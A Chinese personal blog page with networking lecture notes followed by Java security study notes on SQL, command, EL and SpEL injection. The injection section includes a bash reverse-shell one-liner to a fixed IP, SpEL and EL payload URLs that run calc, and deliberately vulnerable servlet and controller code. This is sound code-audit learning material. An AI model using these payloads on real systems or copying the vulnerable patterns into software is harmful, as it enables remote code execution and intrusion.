<h3 id="052讲-开放最短路径有限OSPF的基本工作原理"><a href="#052讲-开放最短路径有限OSPF的基本工作原理" class="headerlink" title="052讲 开放最短路径有限OSPF的基本工作原理"></a>052讲 开放最短路径有限OSPF的基本工作原理</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220825120304564.png" alt="image-20220825120304564"></p>
<h3 id="055讲-网际控制报文协议ICMP"><a href="#055讲-网际控制报文协议ICMP" class="headerlink" title="055讲 网际控制报文协议ICMP"></a>055讲 网际控制报文协议ICMP</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1661526906733.png" alt="1661526906733"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1661526958759.png" alt="1661526958759"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1661527102767.png" alt="1661527102767"></p>
<h3 id="056讲-虚拟专用网与网络地址转换NAT"><a href="#056讲-虚拟专用网与网络地址转换NAT" class="headerlink" title="056讲 虚拟专用网与网络地址转换NAT"></a>056讲 虚拟专用网与网络地址转换NAT</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1661560043950.png" alt="1661560043950"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1661560868562.png" alt="1661560868562"></p>
<h3 id="058讲-运输层端口号、复用与分用的概念"><a href="#058讲-运输层端口号、复用与分用的概念" class="headerlink" title="058讲 运输层端口号、复用与分用的概念"></a>058讲 运输层端口号、复用与分用的概念</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1661609966223.png" alt="1661609966223"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1661610485208.png" alt="1661610485208"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">视频6分钟开始举例用户网文WEB服务器（使用DNS协议和HTTP协议）</span><br><span class="line">https://www.bilibili.com/video/BV1x4411d7HU?p=58&amp;spm_id_from=pageDriver&amp;vd_source=d5448e640adeda715972607248810967</span><br></pre></td></tr></table></figure>

<h3 id="059讲-UDP和TCP的对比"><a href="#059讲-UDP和TCP的对比" class="headerlink" title="059讲 UDP和TCP的对比"></a>059讲 UDP和TCP的对比</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1661612374565.png" alt="1661612374565"></p>
<h3 id="060讲-TCP的流量控制"><a href="#060讲-TCP的流量控制" class="headerlink" title="060讲 TCP的流量控制"></a>060讲 TCP的流量控制</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220828085017386.png" alt="image-20220828085017386"></p>
<h3 id="061讲-TCP的拥塞控制"><a href="#061讲-TCP的拥塞控制" class="headerlink" title="061讲 TCP的拥塞控制"></a>061讲 TCP的拥塞控制</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220828085441959.png" alt="image-20220828085441959"></p>
<h3 id="064讲-TCP的运输连接管理-—-TCP的连接建立"><a href="#064讲-TCP的运输连接管理-—-TCP的连接建立" class="headerlink" title="064讲 TCP的运输连接管理 — TCP的连接建立"></a>064讲 TCP的运输连接管理 — TCP的连接建立</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有些逻辑可以回过头再看视频</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220828091940293.png" alt="image-20220828091940293"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220828092431863.png" alt="image-20220828092431863"></p>
<h3 id="065讲-TCP的运输连接管理-—-TCP的连接释放"><a href="#065讲-TCP的运输连接管理-—-TCP的连接释放" class="headerlink" title="065讲 TCP的运输连接管理 — TCP的连接释放"></a>065讲 TCP的运输连接管理 — TCP的连接释放</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220828094327003.png" alt="image-20220828094327003"></p>
<h3 id="069讲-动态主机配置协议DHCP"><a href="#069讲-动态主机配置协议DHCP" class="headerlink" title="069讲 动态主机配置协议DHCP"></a>069讲 动态主机配置协议DHCP</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220828103652927.png" alt="image-20220828103652927"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220828104549726.png" alt="image-20220828104549726"></p>
<h3 id="070讲-域名系统DNS"><a href="#070讲-域名系统DNS" class="headerlink" title="070讲 域名系统DNS"></a>070讲 域名系统DNS</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1661692341892.png" alt="1661692341892"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1661692466944.png" alt="1661692466944"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1661693526669.png" alt="1661693526669"></p>
<h3 id="071讲-文件传送协议FTP"><a href="#071讲-文件传送协议FTP" class="headerlink" title="071讲 文件传送协议FTP"></a>071讲 文件传送协议FTP</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220829094948614-1661785352243.png"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1661698686242.png" alt="1661698686242"></p>
<h3 id="072讲-电子邮件"><a href="#072讲-电子邮件" class="headerlink" title="072讲 电子邮件"></a>072讲 电子邮件</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220829091323295.png" alt="image-20220829091323295"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220829091637584.png" alt="image-20220829091637584"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220829091817657.png" alt="image-20220829091817657"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POP3和IMAP4都采用基于TCP连接的客户/服务器方式。POP3使用熟知端口110，IMAP4使用熟知端口143</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220829092538460.png" alt="image-20220829092538460"></p>
<h3 id="073讲-万维网WWW"><a href="#073讲-万维网WWW" class="headerlink" title="073讲 万维网WWW"></a>073讲 万维网WWW</h3><p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220829092957191.png" alt="image-20220829092957191"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">统一资源定位符URL：&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt;</span><br><span class="line">超文本标记语言HTML(HyperText Markup Language):使用多种标签描述网页结构和内容</span><br><span class="line">层叠样式表CSS(Cascading Style Sheets):从审美角度描述网页的样式</span><br><span class="line">JavaScript:控制网页的行为</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220829095226130.png" alt="image-20220829095226130"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220829101825835.png" alt="image-20220829101825835"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220829102225444.png" alt="image-20220829102225444"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220829102545606.png" alt="image-20220829102545606"></p>
<p><img src="/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20220829103424049.png" alt="image-20220829103424049"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://huyaoyao2019.github.io/2023/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" data-id="cljpvmu870003pwez6v5zc54a" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-java安全" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/java%E5%AE%89%E5%85%A8/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T15:29:18.224Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ms08067"><a href="#ms08067" class="headerlink" title="ms08067"></a>ms08067</h1><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">windows版本官网安装</span><br><span class="line">setting 有个wsl要注意下</span><br><span class="line"></span><br><span class="line">docker run ubuntu echo &quot;hello world&quot;		#测试docker安装</span><br><span class="line">docker search tomcat		搜索镜像</span><br><span class="line">docker pull tomcat			下载镜像</span><br><span class="line">docker images				列出本地镜像</span><br><span class="line">docker rmi ubuntu或image ID或container ID		删除镜像</span><br><span class="line">docker run -p 8080:8080 -d dordoka/tomcat</span><br><span class="line">	-d 容器在后台运行</span><br><span class="line">	-p 容器内端口绑定到指定的主机端口</span><br><span class="line">	-P 容器内端口随机映射到主机端口</span><br><span class="line">	-t 提供终端输入</span><br><span class="line">	-i 提供交互</span><br><span class="line">	http://127.0.0.1:8080/host-manager/html</span><br><span class="line">docker ps			#查看容器</span><br><span class="line">	-a 列出所有容器</span><br><span class="line">	-q 仅列出容器id</span><br><span class="line">docker stop dordoka/tmocat或image ID或container ID</span><br><span class="line">docker exec -it fe98 /bin/bash</span><br><span class="line">	exit退出</span><br><span class="line">docker start 标识</span><br><span class="line">docker restart 标识</span><br><span class="line">docker rm 容器id			删除容器</span><br><span class="line">docker cp ./aa.txt fe98:/root/		复制文件</span><br><span class="line"></span><br><span class="line">docker-compose文件存在image镜像配置文件包括端口之类</span><br></pre></td></tr></table></figure>

<h3 id="java基础知识"><a href="#java基础知识" class="headerlink" title="java基础知识"></a>java基础知识</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">访问控制修饰符 default public protected private</span><br><span class="line">非...		final abstract static synchronized</span><br><span class="line"></span><br><span class="line">变量 			局部变量 类变量(静态变量) 成员变量(非静态变量)</span><br><span class="line">数组			存储在堆上 保存多个同类型变量</span><br><span class="line">枚举			限制变量只能在预先设定好的值</span><br><span class="line"></span><br><span class="line">继承			被继承的超类 super class 派生类为子类 subclass</span><br><span class="line">*************java ee分层模型</span><br><span class="line">	Domain Object		java对象组成 包含各自所需的业务逻辑方法</span><br><span class="line">	Data Access Object	数据库访问对象 实现数据库增删改查</span><br><span class="line">	Service				业务逻辑对象组成 系统所需要的业务逻辑方法</span><br><span class="line">	Controller			用于拦截用户请求 调用业务逻辑方法 去处理 结果发给View</span><br><span class="line">	View</span><br><span class="line">	</span><br><span class="line">*************MVC框架简述</span><br><span class="line">	Model View Controller</span><br><span class="line">	servlet API -》 Struts -》 EJB -》 Spring -》 Spring MVC</span><br><span class="line"></span><br><span class="line">1.基础语法掌握</span><br><span class="line">2.看懂代码实现的逻辑</span><br><span class="line">3.各个框架的搭建使用方法</span><br><span class="line">4.快速判断审计项目使用什么框架写的 jar包 看配置 代码引入类</span><br><span class="line"></span><br><span class="line">*************java servlet 核心技术</span><br><span class="line">	web.xml	&lt;?xml ...?&gt; &lt;web-app&gt;</span><br><span class="line">        &lt;servlet&gt;配置入口</span><br><span class="line">            &lt;description&gt;</span><br><span class="line">            &lt;display-name&gt;web应用名字</span><br><span class="line">            &lt;servlet-name&gt;声明servlet名称以便后面映射使用</span><br><span class="line">            &lt;servlet-class&gt;对应类路径</span><br><span class="line">        &lt;servlet-mapping&gt;路径入口</span><br><span class="line">            &lt;servlet-name&gt;上文配置servlet名称</span><br><span class="line">            &lt;url-pattern&gt;组件访问路径</span><br><span class="line">*************java filter 核心技术</span><br><span class="line">	servlet提供filter接口</span><br><span class="line">	对所有web资源管理 实现权限访问控制 过滤敏感词汇 压缩响应信息</span><br><span class="line">	web.xml &lt;?xml ...?&gt; &lt;web-app&gt;</span><br><span class="line">		&lt;filter&gt;</span><br><span class="line">			&lt;filter-name&gt; &lt;filter-class&gt;</span><br><span class="line">		&lt;filter-mapping&gt;</span><br><span class="line">	多个filter web.xml先申明先执行</span><br><span class="line">	</span><br><span class="line">*************java 反射机制</span><br><span class="line">	在静态语⾔中，⼀般对象的类型都是在编译期就确定下来的。⽽通过 Java 反射机制，可以动态的创建对象并调⽤其⽅法和属性</span><br><span class="line">	C/C++ 不存在反射 使运行中的程序能够获取自身的信息 可操作类或对象内部属性</span><br><span class="line">	程序运行时查找对象所属的类 任意一个类的成员变量和方法 构造一个类的对象 调用任意一个对象的方法</span><br><span class="line">	命令执行类</span><br><span class="line">		java.lang.Runtime主要方法getRuntime()返回RUntime类的对象</span><br><span class="line">			Runtime类调用exec()方法执行命令</span><br><span class="line">	获取类的对象方法</span><br><span class="line">		1.Forname() 2.直接获取 3.getClass() 4.getSysClassLoadaer().loadClass()</span><br><span class="line">不安全的反射 无视类方法、变量访问权限修饰符，调用任意类的任意方法、访问并修改成员变量值</span><br><span class="line"></span><br><span class="line">*************类加载</span><br><span class="line">java源文件(xx.java)通过javac编译成字节码文件(xx.class) 再使用类加载器加载到JVM</span><br><span class="line"></span><br><span class="line">加载Load-&gt;Link链接-&gt;Initialize初始化</span><br><span class="line">	将类的.class文件中二进制数据读入内存中，把它放进运行时数据区的方法内，然后在堆区创建java.lang.Class对象</span><br><span class="line">	将创建成的类合并至java虚拟机中，使之能执行的过程</span><br><span class="line">	JVM负责的类进行初始化</span><br><span class="line"></span><br><span class="line">*************动态代理</span><br></pre></td></tr></table></figure>

<h3 id="5-1-sql注入"><a href="#5-1-sql注入" class="headerlink" title="5.1 sql注入"></a>5.1 sql注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SQL注入的根本原因在于SQL语句的拼接构造。</span><br><span class="line">1. JDBC字符串拼接</span><br><span class="line">JDBC有两种方式执行SQL语句，分别为**PreparedStatement**和**Statement**。</span><br><span class="line">- Statement方法在每次执行时都需要编译</span><br><span class="line">- PreparedStatement会对SQL语句进行预编译，后续无需重新编译</span><br><span class="line">理论上PrepareStatement的效率和安全性会比Statement要好</span><br><span class="line"></span><br><span class="line">2. 框架使用不当造成SQL注入</span><br><span class="line">Mybatis</span><br><span class="line">	`#`的`$`的区别</span><br><span class="line">        `#`号会点语句进行预编译</span><br><span class="line">        **$&#123; &#125; 只是进行string替换，动态解析SQL的时候会进行变量替换**</span><br><span class="line"></span><br><span class="line">指定操作数据库的文件 建立session会话</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisDemo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>  SqlSession session ;</span><br><span class="line">    <span class="keyword">private</span> InputStream in ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            in = Resources.getResourceAsStream(<span class="string">&quot;SqlMapConfig.xml&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">SqlSessionFactoryBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>();</span><br><span class="line">        <span class="type">SqlSessionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> builder.build(in);</span><br><span class="line">         session = factory.openSession();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hibernate</span><br><span class="line">特有的语法</span><br><span class="line">hibernate.cfg.xml 操作数据库的文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">表名作为变量 需要进行拼接</span><br><span class="line">select * from `user`   </span><br><span class="line">select * from &#x27;user&#x27; #报错</span><br><span class="line">使用order需要拼接</span><br><span class="line">select * from user order by name</span><br><span class="line">select * from user order by &#x27;name&#x27; #语义不对 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参考</span><br><span class="line">https://xz.aliyun.com/t/7919</span><br><span class="line">[Java安全编码之sql注入](https://www.anquanke.com/post/id/212897)</span><br><span class="line">[深入理解SQL注入与预编译（下）](https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be)</span><br></pre></td></tr></table></figure>

<h3 id="5-3-注入"><a href="#5-3-注入" class="headerlink" title="5.3 注入"></a>5.3 注入</h3><h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Runtime类调用系统命令</span><br><span class="line">	String cmd = req.getParameter(&quot;cmd&quot;);</span><br><span class="line">	Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">Runtime类底层调用ProcessBuilder类</span><br><span class="line">	ProcessBuilder pb = new ProcessBuilder(cmd);</span><br><span class="line">	Process process = pb.start();</span><br><span class="line">	</span><br><span class="line">        //不能执行</span><br><span class="line">//        String cmd = &quot;ping baidu.com &amp; dir&quot;;</span><br><span class="line">//        String[] cmd = &#123;&quot;ping&quot;, &quot;baidu.com &amp; dir&quot;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //能执行</span><br><span class="line">        String cmd = &quot;ping baidu.com&quot;;</span><br><span class="line">//        String cmd = &quot;cmd /c ping baidu.com &amp; dir&quot;;</span><br><span class="line">//        String cmd = &quot;cmd /c \&quot;ping baidu.com &amp; dir\&quot;&quot;;</span><br><span class="line">//        String[] cmd = &#123; &quot;cmd&quot;, &quot;/c&quot;,&quot;ping baidu.com &amp; dir&quot;&#125;;</span><br><span class="line">//        String[] cmd = &#123; &quot;cmd&quot;, &quot;/c&quot;,&quot;ping&quot;, &quot;baidu.com&quot;, &quot;&amp;&quot;, &quot;dir&quot;&#125;;</span><br><span class="line"></span><br><span class="line">        Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        </span><br><span class="line">	cmd /c dir 执行完dir后关闭命令窗口 </span><br><span class="line">	/k	不关闭</span><br><span class="line">	/c(clean) /k(keep)</span><br><span class="line"></span><br><span class="line">/bin/bash -c &quot;echo 111 &gt; 1.txt&quot;			#一定要加双引号</span><br><span class="line">/bin/bash -c echo 111 &gt; 1.txt			#没有写进去</span><br><span class="line">经典反弹shell</span><br><span class="line">/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.213.130/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">案例SpLE</span><br><span class="line">程序中存在某种功能直接执行java代码 比如反射机制</span><br><span class="line">此处obj缺start()方法 method缺&quot;calc&quot;参数 使用method.invoke(obj)调用</span><br><span class="line">Apache Commons collections 反序列化漏洞存在这个问题</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/java%E5%AE%89%E5%85%A8/image-20230509145145937.png" alt="image-20230509145145937"></p>
<h4 id="表达式注入"><a href="#表达式注入" class="headerlink" title="表达式注入"></a>表达式注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">案例SpLE</span><br><span class="line">本质为java代码的另一种形式 Struts的OGNL表达式-&gt;远程代码执行</span><br><span class="line">jsp中表达式注入	需要递归解析</span><br><span class="line">SimpleEvaluationContext用不了</span><br><span class="line">StandardEvaluationContext有可能 高版本spring boot对输入的内容进行限制防止递归解析</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;Java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;EL表达式实例页面&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;center&gt;</span><br><span class="line">    &lt;h3&gt; 输入的name值为：$&#123;param.name&#125;&lt;/h3&gt;</span><br><span class="line">  &lt;/center&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;Java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  $&#123;Runtime.getRuntime().exec(&quot;calc&quot;)&#125;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    @RequestMapping(&quot;/vul&quot;)</span><br><span class="line">    public String vul(String message)&#123;</span><br><span class="line">        /*</span><br><span class="line">        payload</span><br><span class="line">        http://127.0.0.1:8080/vul?message=$&#123;new%20java.lang.ProcessBuilder(new%20java.lang.String(new%20byte[]&#123;99,97,108,99&#125;)).start()&#125;</span><br><span class="line">         */</span><br><span class="line">        throw new IllegalArgumentException(message);</span><br><span class="line">    &#125;</span><br><span class="line">    @RequestMapping(&quot;/demo&quot;)</span><br><span class="line">    public String demo(String payload)&#123;</span><br><span class="line">        /*</span><br><span class="line">        http://127.0.0.1:8080/demo?payload=T(Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">         */</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        EvaluationContext evaluationContext = new StandardEvaluationContext();</span><br><span class="line">//        EvaluationContext evaluationContext = SimpleEvaluationContext.forReadOnlyDataBinding().build();</span><br><span class="line">        //表达式部分可控</span><br><span class="line">        Expression expression = parser.parseExpression(payload);</span><br><span class="line">        expression.getValue(evaluationContext);</span><br><span class="line">        return &quot;SpELl 注入测试&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

